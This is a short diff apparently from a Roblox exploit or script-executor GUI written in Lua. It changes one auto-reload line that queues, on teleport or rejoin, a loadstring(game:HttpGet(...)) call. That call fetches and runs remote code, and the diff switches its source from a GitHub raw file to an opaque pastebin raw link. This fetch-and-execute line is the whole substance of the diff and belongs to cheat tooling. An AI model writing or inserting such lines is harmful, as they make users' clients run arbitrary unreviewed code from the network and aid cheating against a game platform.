@@ -3183,7 +3183,7 @@ local script = G2L["41"];
 			-- queue the gui to autoload on rejoin
 			if queueteleport then
 				pcall(function()
-					queueteleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/agarv69/Universal-Script-GUI/refs/heads/main/Universal%20Script"))()]])
+					queueteleport([[loadstring(game:HttpGet("https://pastebin.com/raw/sLjp6RPD"))()]])
 				end)
 			end
 	
